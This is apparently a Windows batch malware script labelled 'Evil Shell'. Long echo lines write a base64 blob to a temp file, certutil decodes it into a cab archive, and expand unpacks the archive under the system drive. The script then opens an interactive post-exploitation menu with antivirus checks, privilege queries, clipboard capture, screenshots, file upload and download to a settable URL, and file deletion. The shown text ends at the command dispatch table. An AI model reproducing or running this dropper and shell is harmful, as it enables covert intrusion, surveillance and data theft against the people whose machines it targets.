echo SN5Xf5Fbwyvh/q7l5cunoPFY0H8MPb8Sbrm78y81yah+ZVP6TttfCQN2UYtfvoba >>%temp%\data_encode.txt 
echo W3DiyNmGSmhdffvnTjI03rN3fzlCcxwu+nxAkA+H6pNr8Hw35zhc9erw/jPvoPGf >>%temp%\data_encode.txt 
echo uJnKKT0OZ7/ZkKI+huRRxvY4d+s4vNipw0D/xBd4EB40utPgE/Bhv/V+HrN7oPK6 >>%temp%\data_encode.txt 
echo bExJOQG7enbw9yrsyoPq4IppK0/AmfI1mw3KF9H4dZ++69QJuLN95y8vXGfRePhi >>%temp%\data_encode.txt 
echo U3GHKhhQvc1z1TI0n1ta3x3uDwJGk3jrag2BtVYSK/qRmP/lWQKtr5EY5Uyiz4fV >>%temp%\data_encode.txt 
echo BNbGk+jXcIbACZ+SuDKJxMrOJFr3nCawIIfESppE881TBHpsItFPT6JmIImVl04S >>%temp%\data_encode.txt 
echo OGEjialTSXwwjMTs+1UEWj8nEbxB4oNIErN7kWiuO0FgbRGJ1bNJDI8ksawviflo >>%temp%\data_encode.txt 
echo fDrigj0kmleQmGggsQySmN+VRHCtksDq3SQqVpHoYSHRPJLEisEkrgQk1pYcI9Bq >>%temp%\data_encode.txt 
echo ItFnKIkVl44SOGEtiWAcibneJFKnjxBY8S6JUWNJrPUicULdYQJvrSfRnE4iGEGi >>%temp%\data_encode.txt 
echo tf4QgaCiGaKnIbw3jh0D4++S2N8u/pKFHRTjPWLswxjrKuQXiXvsBUWiDk5hkaiz >>%temp%\data_encode.txt 
echo gP0AY10H7AYYP4GWFYk6ChVFok4N9gqM93IPFol7+IeLxL3eyiJRt+Jkkai7cb5I >>%temp%\data_encode.txt 
echo 3JO/VCTuId8sEvfK7xWJOguPi0Rdi3bF4l58h2JxD757sbiH3qdY1CnxKRZ1FHyL >>%temp%\data_encode.txt 
echo Rd0Fv2JRl4RCiB6bBHUS9NgkYGayGE9GJ3bE+g/48Qo/WmHyRL3w6zuYlGYSjIdO >>%temp%\data_encode.txt 
echo Sk4RnrnSTTpByTtNJz5KJk0UGUmpM80m9DQ2KV38v25Sho0/k0KBRsEIktADHd5r >>%temp%\data_encode.txt 
echo TDLqszOTJ4kGw5ue3+aQz4ii7wjbKVYnSUKYhFNU/Au2ZLD7r82lon4U9p/8qwbm >>%temp%\data_encode.txt 
echo fsdRUqptka5wuN6UzwcJmzh4DJWhykRsk4CIgn+9AoertSCvREs0aT2Kb7bRMN/x >>%temp%\data_encode.txt 
echo fUdY07FORwlZ50KU7rwDTbCni+IPHMrCaSQtlHW+WVlXUTo/B5ngD6gKFA8vJcvD >>%temp%\data_encode.txt 
echo 6ZxaKM+vmTw9zmpBdinZxgUonmujYX5LbcR5PMLRmhMh2k1xsjpZD5dKBN237kj+ >>%temp%\data_encode.txt 
echo WMejEE26mWiin0GT5woK3f1RehQOosCPQOWgEIxCGAqLUFiOgtcofF8C4BEKi9FI >>%temp%\data_encode.txt 
echo XTJafMWxogm9bxgAH6MJXfkSWnFQw3uhtB+iCtehtH1RYzWhEhCF4jdekQh71PbX >>%temp%\data_encode.txt 
echo o4mcBPhnonnimy5u9qBEUpTO34ANxPtiNRI0fiWCfp0/RU2cNBkADsXxK7Z/cEyc >>%temp%\data_encode.txt 
echo b2KwIARNMxomhpC0ccJ9kKCNFPJGNKNhYlQzGn7ZjYuWCGufjSa8/+rIdMI1Ugla >>%temp%\data_encode.txt 
echo lHCNNHsbRFqisD6R6RIF3X2SJpQ3i6DFCeVZibrECelyEe0WWnj8M7DsUJoSCRgm >>%temp%\data_encode.txt 
echo scd9hVVoc6mtHiLNki0mRXNZIuhI2ejTTWmZ6XiBw/MVz1sbPScnR5eC98raldvq >>%temp%\data_encode.txt 
echo lJE50VcUGWhP0MYJdergSIsT03mU2+uAaWK63oj2NkroL1TIVxgi63dIBL0r21gQ >>%temp%\data_encode.txt 
echo fsquRbTuTTSszgTu7SDGjNTuiyfSpZHGCGOrUgIK0YX9bW0urJYI+kf+NvF4nJUI >>%temp%\data_encode.txt 
echo 88UWF+4DfoiW6oZoKY7WPcnjqW3uHbYhjqsGacDoQRqCX+3AX+anARv8RH7CcBF1 >>%temp%\data_encode.txt 
echo 5eK6YEb4drl4ny20rWP2+Y3vqfuGaYg1zpH34nCyzLJym815hPZy7WtQ87wPhrVe >>%temp%\data_encode.txt 
echo 33Yva0DXl1vnO41H/PGt8zH2HEfyTzbjy1La5me+1Tb//Py2+aUL2uaPW9B6/Ycu >>%temp%\data_encode.txt 
echo 1gD/xW23z3d523x1Xtv8Jb+S/1IzfmUzfsGatvPTa0l+STP+N2vblk/QB23z7+1t >>%temp%\data_encode.txt 
echo +/rairbr/+PRtsvve4bkb2/GDz/Xdv4/nW37+mHftZ3/8ndt5994o/X2j/LUAoOn >>%temp%\data_encode.txt 
echo ts3yy7xI/sFm/Po+2lbL9wzTgmEodN/Z9GxlRuc++L7jQMtB590RDa+Z9uNyhUS4 >>%temp%\data_encode.txt 
echo 77Z0/Mfn23/f59tiEGyKNzYZOMfeBIJNTdalsYEPP0QJFjwMjTRa0IsIdsyzENHi >>%temp%\data_encode.txt 
echo ki1TR+nTBfvVpjR9YIC/Li0NjI4I1cbH2SJgPxBzCoZIQM/nEjIMYgSXkGay6MOT >>%temp%\data_encode.txt 
echo jToUm+sSm6bXm8FWl3hjqkDShdrdvYTZHBlNc4nVZ7bK9nJ6SZ8ZnJWRoTc2mrjO >>%temp%\data_encode.txt 
echo dbEbGtE3Wr1e6DzSYouYMsL02E4ZYuotKBsY3S46S58xM0qfMcmUkY5bGmzKwt6I >>%temp%\data_encode.txt 
echo gPezpY/UgX4O1DjBxjoigpuYGiu4FoszpOu1FtxefAYmOTdJNjbCYMkMR1nAPFSj >>%temp%\data_encode.txt 
echo EH1K1uTJ+gx7TaqEMjKTMzKzzCONk0wJ4M+YMsqky0qzySwBgFdCYyJDI+yy1rWL >>%temp%\data_encode.txt 
echo STZY9KFNbnJOtYvJTIs3zjAYdUCH80ckWzIF10PoSRVL0zEuCcUtbWZOHIBdzhH6 >>%temp%\data_encode.txt 
echo 5On6Z+jdJCGCYf/mjBTnVm2Ta426WLPBKMgUrHOJa7SHvh6fN9o934BjjRbPP8Ax >>%temp%\data_encode.txt 
echo YYxtkWCIMKRkYKNwW51s5mS0Ol2G0LMHnCNMyTobPzQbySdZ4mjwPKe5BIU0p0RJ >>%temp%\data_encode.txt 
echo 62wDEcxoSoX7DZuzQanOSnBPm9LRoEBXMKKxXNOMkgDCnVF3msUmRQjnomn3NaTF >>%temp%\data_encode.txt 
echo HVRaqbODDR0Uj8bXFEYJdveULQlDHSbMDjBbOA8zZFgEvlDjJQItEr2IYFICWILG >>%temp%\data_encode.txt 
echo zxjsni/YpNNHYUdWpbhu2uAoAN7DJY8OHYXP9wo1jsLDCdx1HpWVlmkImpmpjzMl >>%temp%\data_encode.txt 
echo GHT64NTkDOD0nP00ztTIBywuI9Q43ZBhMmKPDmK1Lagmnwg90hKrJx5dDowxyRkG >>%temp%\data_encode.txt 
echo 7G0iAT3pxhLyrhHlj/Ph1qNSP3NqMhSEpQjAOklYWpYlFTc3SHDJhXrbWZh7JqMF >>%temp%\data_encode.txt 
echo LT2jBf9ZuI0NkiYq6kRU/mi7bGPF5WwQvj6OR5kER2N4hYsWeitWWP9GC+cxerEf >>%temp%\data_encode.txt 
echo jzqsXwmgh7h+2cpPAB3QHJiIhS4W9R9z4v9njq2eO0MiL2u+wO8MkhY+IzXfS/Zx >>%temp%\data_encode.txt 
echo We7ZWlmS32nu2cnn932+wvmcfmtaB/vo7R3aNWFq03cgyW/4nFZxXPtvjTfK9UwT >>%temp%\data_encode.txt 
echo vTZdCyaYtODgNG3rDcLlnNDa/sxu/Wjef1bg5ub2PzKyPFo9bC1u9fhjzKzWDWOL >>%temp%\data_encode.txt 
echo /NYNN/+xVpj/7+PgjzEcJE7tBO2Y9c5ozZw3c15/G33jRZti6gYR566tfSx8u51t >>%temp%\data_encode.txt 
echo FbAApd/1Qc0HrXXm3Kc2xXsblv7G9FobbkPpj627tM4LfL/u6rrxrZc/+33hLNoF >>%temp%\data_encode.txt 
echo hZrXa3xAUs2UmoBn01dVX6h9CAA9W8xpRutyVN2vhzm2IxOlj6trPeB/oP0d3vf/ >>%temp%\data_encode.txt 
echo Tds2//vj41cOp2aHs+1o7bur/chaSfJ9x4n3RH+oHZOSrEsS/JlqLJk6jYbgNfpA >>%temp%\data_encode.txt 
echo bYEn5MP+tpKM+hlJoq9TWzIiHXbrl2RAbwEazR/3ARCtwhx6OOpDySg1FUuNpyZS >>%temp%\data_encode.txt 
echo JiqbmkMtovKof1IFVCFVRu2ljlAnqVrqGnWbekK50B1pT3oAPYSW0Wo6jI6hx9Ep >>%temp%\data_encode.txt 
echo tJGeQc+m/0Z/RJ+nb9F9A14OSA2wBqwMKArYG3A7IC9wY+CTwB7SF6SzpSukBdJ4 >>%temp%\data_encode.txt 
echo 2TTZItlW2TbZdtl+WZWsWvat7IrspuyO7LHMlenE9GL6MgMYPyaAgUwYM4pJZF5n >>%temp%\data_encode.txt 
echo Upks5g3mbWYZ8y6zmtnEbGO+YHYxXzEnmRrmEvOUGSGXy9XykfLR8inybPlc+UJ5 >>%temp%\data_encode.txt 
echo nvx9+afyEvl2+QF5jfyRvIOiryJcEaVIVExUGBTLFMWKI4orivuKp4rnlF2UvZQv >>%temp%\data_encode.txt 
echo KpVKtTJMGa18TTldOUv5hnKJslR5VnlFeVv5UNmO7cL2Ywexw1kFG8LqWANrZLNZ >>%temp%\data_encode.txt 
echo K7uIXcr+gy1gP2FL2C/Y/exh9jRbx15lb7P17GPWSdVB5al6XuWrGqZiVJwqTBWv >>%temp%\data_encode.txt 
echo ek2VqjKqslWrVOtVhartqgOqKtVF1XXVE5UL58H15Hy44VwAp+Q03CtcNDeeS+XS >>%temp%\data_encode.txt 
echo uencLG4uN59byq3h1nMfcUXcDm4Pd4Q7x33HXeV+5O5yDznAu/NdeG+e4Tley4fx >>%temp%\data_encode.txt 
echo kfxYPolP5bP4efx8fjGfx6/h1/Nb+L38Yf4M/w1/lb/LP+S7qYeqI9Rx6iS1Xj1T >>%temp%\data_encode.txt 
echo PU+9RL1GvVF9RF2l/kZ9Xf1ADaA77AK9IQXlMAiGwxhogLuxJgJapH3QAhZCjUOj >>%temp%\data_encode.txt 
echo pYg6SJ2m6qiblBsdTU+luwcEB84PLAzsJQ2SJkhflSZL50nnS/OkR6XnZd/Lbsnq >>%temp%\data_encode.txt 
echo ZW5Mb+Z5xpcZylAMw/BMCPMKE8OMZSYwkxkTM4OZwyxi8phVzFrmQ6aY2cNUMXXM >>%temp%\data_encode.txt 
echo TSYC9e3H8uPyWnm9/IncWeGq6KzoofBWUIpQRYQiRqFTGBWnFXUKd2Vf5avKqcpM >>%temp%\data_encode.txt 
echo 5Vzlu8rjyhrlj8p7yv7sS2wUOwb1nQz1Q5JqjupL1V5Vf24oN4IL4sYgWRuRlNdw >>%temp%\data_encode.txt 
echo p7gfkETb8z78YCTNV3kLktsuJLNv+Rv8PX41ks8WJJt76ifq55BkfGEsfBXqoQXO >>%temp%\data_encode.txt 
echo gmvgBlgCBU0lSnzfuCAVN3GxPZBrsh9kt2X3ZQ9lT2QSxoVxZToyXZgejCca7/2Z >>%temp%\data_encode.txt 
echo QcwQZjhDMzJGieShZUKZkWjsRzPxSCqvMcmMntnAlDGUXKXYo6hXNCi6KJ9XapSb >>%temp%\data_encode.txt 
echo lCNYsypftU91XHWdu815o1rHoBrPRX2+jv+av8A/4tupO6n7qOXqcNTPZnUu6uEN >>%temp%\data_encode.txt 
echo 6o/Ve1ALXKEXHAxlcBScDhfCIngUVsFqeBfXPwoI+4eAcqU6Ud0of0pBhVAjqUjK >>%temp%\data_encode.txt 
echo QFnQCvEmtZDaRG2ldlC7qQPUVeoBJaVfovW0he4fmBiYFKgLTA1MCzQH7g90l3pI >>%temp%\data_encode.txt 
echo u0t7S/tIq5V+rArNnmh2ApvFzmGXsavYDewOdjd7lK1ir7DbVDtUx1TVqsGcP6fg >>%temp%\data_encode.txt 
echo tFwMp+MsXDFXjkZ6EpwMjbheE4BgO2ENWpkOUKeob6kfqF8od9qHlqOVyET/lV5G >>%temp%\data_encode.txt 
echo 59Nb6HL6GF1H36SjAs4yw/6rvesBiqvO70TxQlJwsMbKXWP9uYFziWR5f/f9f48Y >>%temp%\data_encode.txt 
echo ojBiggka2sCFZffBrll2N7tLIEo8rhMtXnMj7UXLabRo0cMeesxddBjLeGgzLdW0 >>%temp%\data_encode.txt 
echo w5w4gzaeeMUe41Cll7SHmmo/v/d2CQSSOl47badNJrD7fr/3/f1+3z+fz+cHv32R >>%temp%\data_encode.txt 
echo K+SHlevUG1C/pahgVhVVRX1WZTVRUzRD26pt16q12zX6YV96bjwhdAjHhX5hAFg1 >>%temp%\data_encode.txt 
echo JOSKorJDeVr5S2VO6UXm/NScNS+zCq1rretRE9vhO9u6zxpH1N+13NMf9Fkld6Au >>%temp%\data_encode.txt 
echo vss8wTzIfZcb4l7kZrmPuALhceFl4S3hQ+GM8G/CZWKBWCSWiLwYE/vEfxA/Es+K >>%temp%\data_encode.txt 
echo n4ifi2uRFdf4fX7erwPx8qVrpJul26TflTqkh6Q/l16QrpKj8nvyAeVKtVENq99X >>%temp%\data_encode.txt 
echo J9RNQJSolta6tUeBJbPaGe1T7St6vn6tfp1+k16tN+utejew4xH9CsNj/MB40fi+ >>%temp%\data_encode.txt 
echo OWb+E+L/uVlgbUAOiJZufdOiD13YiJpuYzoQ3xeYXyCql7M8exfbyPay+7iHuFe5 >>%temp%\data_encode.txt 
echo N7n3OB7RfYI/wzcLncLV4ofI6E2o49v8af+D/sf8g8Dlt/0L/uslQaqU7pDuARo/ >>%temp%\data_encode.txt 
echo Jb2Omv2l9LlUJJfKvHyn3CLfK98vD8o/kq9QfkORFEPZqTQptnK3co/yTeWIckz5 >>%temp%\data_encode.txt 
echo nvKE8rzyY2VEeQf4u1a9GvjLq9VqHHg7oJ5Wz6q5WpF2nebRLC2ICjipTWpvaT/T >>%temp%\data_encode.txt 
echo PtYu16/Wi7B2Wb8VObRHb9A79Aec9T+GXBrX39Cn9Hf0z/QrjVuN/cZDxjOOT94x >>%temp%\data_encode.txt 
echo PjI+NdYBD1lUyjfM/aiV+8wTZoX1e9Y+iz5IiZ7p/mP2NfYcey13B9fDPcr9Hdjt >>%temp%\data_encode.txt 
echo Tt7mB/nn+SbBECvFP/K/5p+Tci36IBDa3+S+wf0KsY6L3xL/QHzWv096WvqOmtLu >>%temp%\data_encode.txt 
echo 0Dv15/WfmFdY+60HrF6LPhCIPnPkcqaFuR/Me4b5hFnD5oFpWVZjq8CzzewIuLWI >>%temp%\data_encode.txt 
echo WytsFuLCvcJ3gKZfEzeJN4pbRFaURE3cLtaLAbFLfBaceg3Q8xX/rJ+XxuVu5XVF >>%temp%\data_encode.txt 
echo Uf8EXnsT3PSRmqNdCVZ6T+MNBR64y9gO9H8aK33VfNf8hUkzm7dU6w5U3FPWs9bH >>%temp%\data_encode.txt 
echo Fn14kfN/1zAGcwvTyhwC4j/O/JB5hXmDeZ/5FbOO/W12C2uxTWySPcI+wg6y73DP >>%temp%\data_encode.txt 
echo 8Kbwh0JQfA1ZXez/NhD8bf8n/i4pR14rXyWLsi0/Lr8gvyH/TDaUSuU2ZZeyTxkG >>%temp%\data_encode.txt 
echo 376k/EQZVx4ENvxS/VS9GrG1taT+jEkfYEQPdn3CbGJ3sD9l7+Ie5J7gfsh9lS/n >>%temp%\data_encode.txt 
echo 7+Mf5Uf5K4UdqNlPhK9AM3T7X/C/6Z/2f+g/hJr5G+nvpfeltbJXflj+C/nn8uXK >>%temp%\data_encode.txt 
echo fcoAfPKB8gzYeh71UwE2kPUR/UaDNe43cuZznDMJxfCfZd6KLLjfpGqdxrOI+x3+ >>%temp%\data_encode.txt 
echo 63wjKuB9/4/UUTD+hPo9vV9XjWqjzxgyThsPmgJYIKdwjfPMm7XMA8woWPEp9uds >>%temp%\data_encode.txt 
echo VHjOnys/haxfqxQoX1NKFFGJKTPKvyp5qqkeUM+o67S4NqS9CCz36QFw0aCeNLqQ >>%temp%\data_encode.txt 
echo n8XmNnOnSQmXPn/l94F5a9kNbCUbBt52A/HeZs+wHdxR7mH45Lf8J/1BKSh/W75M >>%temp%\data_encode.txt 
echo UbG+q4xrjY3GJoOHKthl3G0kYPEx40lj2HgB/L/GXGdeZX4V7GCZT5rPma+A+98y >>%temp%\data_encode.txt 
echo P0bW320lrYesP7V+YL3k8Jl7zudvmc+YCqi9Y4jyj9kcROEU9xnXwv8jfxDa7hnh >>%temp%\data_encode.txt 
echo U+GcmA8+KwGP3eJ/Doz1sv+v/WukQmmjdBMUWqPUI/2ZNCf9i/QZIsLJdXKn/IH8 >>%temp%\data_encode.txt 
echo gVKN7PxNjdWatRP6h6jC603RNOjDnirWOOcDn2Sf5V7iHhEfE58TXxffhYq4TDmg >>%temp%\data_encode.txt 
echo PKC8qv6zRn/XSXFLYCvYGraWrWPr2QZkY5RNsGl2RBlVxpSTyKpp+HpWOafkqLkq >>%temp%\data_encode.txt 
echo UYtVr8pAzVWoVVAF9eCksJpwNF2P2qv2qf1QdcPqiDqmjiPGU+o0VN28uoDqydMK >>%temp%\data_encode.txt 
echo gTxE82qMJiN3qrRarV5rAgonoOu6tR6tV+sDIg1C341oY9q4NgFWmwYyz2sLWo6e >>%temp%\data_encode.txt 
echo B51XBJ3n1RlgVIVepdfq9XoTlF4CqNCt9+i9eh9yalAfRk6OAbEmgFjTUHrz+gJ0 >>%temp%\data_encode.txt 
echo Xp5RaBSB570GY8hGhVFl1Br1RhO0XsLoNLqNHqMXudhvDCLGOU1rnDNkM/wsP8dP >>%temp%\data_encode.txt 
echo Y/3zUEILGS/kqfnqBrVI3ZjxRxk8ooOha+CROvikQc1JrMmhH0AdZ0+xE+wkOwWF >>%temp%\data_encode.txt 
echo P83OsLPg1nn2LLsANMzhcrk8Lp8r5DZwRdxGjnDFnJcr4xhO4GRO5yq4Sq6Kq+Fq >>%temp%\data_encode.txt 
echo uTqunmvgmrgQ9gdRLsF1YZdwBEh6lOvljmG/cJzr5wa4QTDmMHeCG+FGuTHsIMaR >>%temp%\data_encode.txt 
echo YxPcJDfFneamuRlw6Rw3z53lFrhzXA6fy+fx+Xwhv4Ev4jfyhC/mvXwPdgq9QMA+ >>%temp%\data_encode.txt 
echo /3F/v38AnDTkH/afQDaO+sdQH+P+U/4J7B1GoL/HwBzj2inEaBJROo04zSBSc4jV >>%temp%\data_encode.txt 
echo Wa1Cr0R0avSj+jH9OJT3kH5CH9VP6qf0Sf20PqPP6Wf1c3qukW9sQI0VG2WGAPVd >>%temp%\data_encode.txt 
echo adQYddCNISNqpFFtR4yjUN/HoSKHjBPGqKPAJ4EUM8Yc9OQ56LN8cwMUWrFZZgqm >>%temp%\data_encode.txt 
echo blY6irzBDJlRM212mUfMo+Yx87g5YA4BpUfNk+Ypc9I8bc6Yc+Dwc2aulQ8W3wgl >>%temp%\data_encode.txt 
echo WmYJYPJKq8aqgyYNWVErDVV6xDpqHbOOWwPWENTpqHXSOmVNWqetGWvOOmuds3K6 >>%temp%\data_encode.txt 
echo 1+T0IMa5TD6zgdnIFDNljMDo0Hs1TB3TwISYKJNmuqAJjjr7wgFmiDkBVDvJnMLO >>%temp%\data_encode.txt 
echo 8DQzA91/ljnH5LL5QKWNbDFbxgqsDnyqQS02sCFUYprtAjccBW4cZwfYIfYEO8qe >>%temp%\data_encode.txt 
echo RE5NIp9mkEtnkUe5yKENyJ9i5I6AvKlEztQhX0LIlTRy5Qjy5BhyZAD5cQK5cRJ5 >>%temp%\data_encode.txt 
echo MYmcmEE+nEUu5CIPNiAHivkyXuB1vpKv4ev4BmB1lE/zXfwR/ih/jD/OD/C0MkaM >>%temp%\data_encode.txt 
echo MWPcmDCmjGnsheaNBSPHzDMLzSKTmF6TMWWzAjqg1qw3m8wwtECn2W32QD33mf3m >>%temp%\data_encode.txt 
echo oDlsjkBDjZsT5pQ5DUU47+yV8qALiyxiebFfkq0K7JdqrXqryQpbCavT6rZ6wPR9 >>%temp%\data_encode.txt 
echo Vr81aA1bI9YYVOME9Pa0NWvNWwvQX2tydPpDISaPKWSKGMJ4GQa6u4KpYmqZeqaJ >>%temp%\data_encode.txt 
echo CTMJ7M+7mR6ml+lj+jM79DHsviaYKezRZ5l5aLYc6IZCtgia2MsyrAxUrAIq1gMR >>%temp%\data_encode.txt 
echo w0DETjBGD/RcH3TyIDsMVTHGjqO2p1DXs6jpBdRzHmq5CHXsRQ3LqN8q1G496jaM >>%temp%\data_encode.txt 
echo mu1EzfagXvtQq4Oo0xHU6Djqcwq1OYu6XEBN5qEei1CLXp7hZb6Cr+JrsStowp4g >>%temp%\data_encode.txt 
echo wXfy3XwP38v38f3QTcP8CD/Gj/MT/BQ/DYya5xf4HCEPe4YigQhegRFkoUKoEmqF >>%temp%\data_encode.txt 
echo eqFJCAsJaM5uoUfoFfrA9oPCsDAijNE9Vr97fvIl+WX5Vfmv5JzhNZTGc758lg05 >>%temp%\data_encode.txt 
echo cyvEHI5iNLobGBJOCpPClDArzAnzwoJQKBKxWBREWdTFCrFKbBITYlo8IvaIveKg >>%temp%\data_encode.txt 
echo WKYwSo1Sq9RD14aVKPaiPUovdMeQciLDSKfASBSHKfpWgH+6wTlj4Jlz4BgCXmkC >>%temp%\data_encode.txt 
echo l/QDn6bBGQQ80QRu6AcfTIMDCHCmApjfDVzpN9yzkDXOoTAG8a5FrBOI8jFE+Tgi >>%temp%\data_encode.txt 
echo PMoSqVjySmUSA1UuS7pUAW1eK9VJ9VKD1CSFpLAUlYblU/KsXKj8/29G/2/8ORhI >>%temp%\data_encode.txt 
echo kj2RWFU6ndhlHyAGidkdZGswHTlo1+9svtsOpr2eTLvvfL92O5X2iT7WU6oVrD9/ >>%temp%\data_encode.txt 
echo 2bczYce8nlu313nKyJ7dwWQkkfZtTba205MNKS9TWkbKNwdSh2JBY3N5SyCasi+4 >>%temp%\data_encode.txt 
echo f7cdC3mda5mbtwfDce+SDrvsVCIeS9l1dmea9rs5EtudTtqBttVnvrVyZ+XNPreH >>%temp%\data_encode.txt 
echo Z1l/Hz1DgZvYZRed+S/v5xxkWG0KN8dDh5Z33R04aNfF6QkI78rFs6W0c3k54cxY >>%temp%\data_encode.txt 
echo e7Srq6I1no4TtTmQDoZxfXPB+uzrChuLJvGWloL1KTsdpf9ZVMH6pN1GQnaUlB8g >>%temp%\data_encode.txt 
echo 5S3EU3JfjPHZnbaHUGuuTVhQSUskFiLBVJA2OvcTD94ZnoL1LfEkKU/iVvfE1a54 >>%temp%\data_encode.txt 
echo PF3ScHskmIyn4i1p347tdQ23JANtdkc8ub/BQ0pKNpFIjHg9mzPWPKUkFCdk0SQ6 >>%temp%\data_encode.txt 
echo wGrB+kgLicXTxO6MpNBSgqYSD/EWrCeEOAuJxYkvhptassZhNpUORKN2yO3UGUmT >>%temp%\data_encode.txt 
echo 8mbCMgXrS1cxuLhS1ya8ESXOKKQ8Fo/GW+OkvCOQjKkMKY+3p9UlN+BlKJFqiXUy >>%temp%\data_encode.txt 
echo HtLVlbl/yYglNj3RFbUP2tES4jSWOlPIWiAliAoy0gkB+fqq99EJby6nXwvWt6ci >>%temp%\data_encode.txt 
echo sVbiuldb/ta3qz2WjrTZvmp6/iWe2G0nD0aCdurCbpWRQGssnkpHgiuatsXhMud4 >>%temp%\data_encode.txt 
echo WMp3qx2zk5GgRkcNRgOpFKkKhKJ2ck8ykEjYSXIvVpNob45Ggtm7MW5tOkncM4FJ >>%temp%\data_encode.txt 
echo 58Zsj2W3elftX+pYJOlwJOXLXELtnDdGDhesP0xtZky6c0IN2HZsWyBBjw5SC+iI >>%temp%\data_encode.txt 
echo yGNxBOZ5jrTFQ9kazDZURpwlBpKHiE7c005lmd6m0z+VqfRLdnRq+LxRt5mkI+ko >>%temp%\data_encode.txt 
echo HQ+1EtUunEsiEkLTFlZzY+n+JXsro9HqtkQ8CTBpT9lJ9wihp7SRui8ZORhI21kz >>%temp%\data_encode.txt 
echo QCQ7GSPN8XiU7A7HOwAZoXjHVop23qw398RCZUj/NIltawvRTqWZ4bKxyNg6GMds >>%temp%\data_encode.txt 
echo bg9EYl536nsbSSDZmirNONF1hG9rKOT1hCOhkB0D3jLU1rKmGD2bGUUTu6KpLRKL >>%temp%\data_encode.txt 
echo tEXusUNo5Va2BjoXW/kVrQCSoL1vqQWWvagJ5/Ny6OJf0SMJDoknbbQpK9pScA0a >>%temp%\data_encode.txt 
echo xFUb9oXslkB7lFplV1v0voBDAstmKF2iX2Yw+RJdFj0pLAaMJALJlA18T2WTjQC4 >>%temp%\data_encode.txt 
echo vDeknID5qlM7kGU7k9vbEulDXifzSjNVdEGthjuQdx1Ostx8yA13pr8zH8cq+tzg >>%temp%\data_encode.txt 
echo 5m3WxooUC3dkK7PMWUPm7sPEBs1mb8ocyHNJjR7G9Hq2BWIUbR3eCGTmgW/pcKZc >>%temp%\data_encode.txt 
echo 9nrITZmXNxFPoydjlyw5s+ijh0e9/uyI9GtmWDp3Wlg30Mr6Asuvra6k/f+7V06n >>%temp%\data_encode.txt 
echo 7Kybvrj0qqVVVu0OucqIO2xYx5oT7plNAut0Bq53O2yAZAK4aYcIlAE6kpQjIrKD >>%temp%\data_encode.txt 
echo A29i6So7mvBmLqyYTCaFHSTOfM0AynKfX5BtS+Ex4+XMqVLgTmauUUrGRva67/zB >>%temp%\data_encode.txt 
echo UzuVmQ5gwQ4Ew97M9fOLjC21kY2iUyu7V6uVTGcfhT83zHXLqsdNqtU7+bYfaIes >>%temp%\data_encode.txt 
echo vKDeCEnaoKCYwxvL2W6lHfe4bTbeh5cE1y3y/xHLdA68p/Ygm/4rl5o1laHLL5BQ >>%temp%\data_encode.txt 
echo tH4X6fR/WSpVg/+NJfP+z/PlpT3pcP0SMsly/DLmh7+WVvsFZ+yzJOQuiPb31Tin >>%temp%\data_encode.txt 
echo WuiKFnH3P8YPZhE/VloqIRy1xpReHN72wFgrna675fFcbBh2yTB0V+KliijiCEF8 >>%temp%\data_encode.txt 
echo 08nSYbe4Fw38uwlKJesckgJQB8PuFPdGGn118Zo4ENR7PrbBAKDYsyWMBXvU5ZeW >>%temp%\data_encode.txt 
echo vy9f8X7FLeVW9v1KL66yQHGxqRmJvF9bNjoybNEYdTLM+eqSh2ppBmSWg6WyjWUE >>%temp%\data_encode.txt 
echo 2xknH7Gk5WS2qvdrz5MKFE17NESabfBarL2t2U4uEtgqs+UW2w5ffNYOzCzOO6uk >>%temp%\data_encode.txt 
echo l0z3EiumpLxsya7GwqKzH2VZuu7zoXQ94FD6F3NBdewg/XiHu69wqVQllMeXmL+E >>%temp%\data_encode.txt 
echo I/hLOiKjOrPruGj+o5Sx0cVeYMnIjRfPFWFFrizHjsMX2x4sSUTXKRkad0XDFwCM >>%temp%\data_encode.txt 
echo vYwbtFVWAjzf5zhxCwlCW7VSSQI94lyKt5xXS82HSCv0cWypooln6cDNkkzmrTLI >>%temp%\data_encode.txt 
echo xVvuTAVabfXL3Lk48Xv3uilLGjwO5jd4Grv20toj4Kh9O5yiaDxM9jrJ6Sys8cuM >>%temp%\data_encode.txt 
echo VxtPpSLNUTuzNQ1Awu11d2SNZXvdXQNeLO5E6Ovs3qrRd3Gz1S3YRy5KcETNUaKB >>%temp%\data_encode.txt 
echo 8wIxHoseckKS0Y6RaJSWezqwH8FAXsRJIBikHx+75BhUjNo3puiPaFw7bfQnUI4W >>%temp%\data_encode.txt 
echo hGk3su5+hgQubmide2+KahLa1ZHQkfTipFJ2IBkMY9LA+i/j4+2dgbZE1E59qYRY >>%temp%\data_encode.txt 
echo R4twMS2cNySbGTfeGXNehZDmO+JpOxEINdxI3IzI7Ph+Pbu/njUacpZn+ZU2srBw >>%temp%\data_encode.txt 
echo +N8B >>%temp%\data_encode.txt 


if exist "%temp%\data_encode.txt" (
if exist "%systemdrive%\_temp_\data.cab" del /q "%systemdrive%\_temp_\data.cab" >nul
certutil -decode "%temp%\data_encode.txt" "%systemdrive%\_temp_\data.cab" >nul 2>&1
expand "%systemdrive%\_temp_\data.cab" -F:*  "%systemdrive%\_temp_" >nul 2>&1
del /q "%systemdrive%\_temp_\data.cab" >nul 2>&1
) else (
echo [*] %vbscript%, %jscript%, %ps1% can't Extract
)


echo [*] Welcome To Evil Shell type help for command menu
:loop
echo.
set shell_output=
for /f "tokens=*" %%A in ('whoami') do set host_info=%%A
set /P shell_output="%host_info%.:#> "
if errorlevel 1 goto loop
set shell_output=%shell_output:"=%

if "%shell_output%"=="" goto loop
if "%shell_output%"=="help" call :help & goto loop
if "%shell_output%"=="ps" call :ps & goto loop
if "%shell_output%"=="ifconfig" call :ifconfig & goto loop
if "%shell_output%"=="show_drive" call :show_drive & goto loop
if "%shell_output%"=="get_av" call :get_av & goto loop
if "%shell_output%"=="sysinfo" call :sysinfo & goto loop
if "%shell_output%"=="pwd" call :pwd & goto loop
if "%shell_output%"=="get_startup" call :get_startup_app & goto loop
if "%shell_output:~0,3%"=="cat" call :cat & goto loop
if "%shell_output%"=="get_priv" call :get_priv & goto loop
if "%shell_output:~0,14%"=="set upload_url" call :set upload_url & goto loop
if "%shell_output:~0,2%"=="cd" call :cd & goto loop
if "%shell_output:~0,8%"=="download" call :download & goto loop
if "%shell_output:~0,6%"=="upload" call :upload & goto loop
if "%shell_output%"=="get_clip" call :get_clip & goto loop
if "%shell_output%"=="screenshot" call :screenshot & goto loop
if "%shell_output%"=="arp" call :arp & goto loop
if "%shell_output:~0,3%"=="rm" call :rm & goto loop
if "%shell_output%"=="get_users" call :get_users & goto loop
